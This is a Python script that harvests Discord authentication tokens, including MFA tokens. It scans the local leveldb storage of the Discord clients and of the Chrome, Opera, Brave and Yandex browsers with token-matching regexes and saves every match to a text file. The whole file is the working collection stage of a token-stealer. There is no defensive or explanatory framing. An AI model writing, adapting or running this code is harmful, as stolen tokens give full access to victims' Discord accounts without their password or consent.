import os
import re
import json

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    output = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        output += f'\n**Discord Token**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                output += f'{token}\n'
        else:
            output += 'No tokens found.\n'

        output += '```'

    with open('discord_token.txt', 'w') as file:
        file.write(output)

if __name__ == '__main__':
    main()
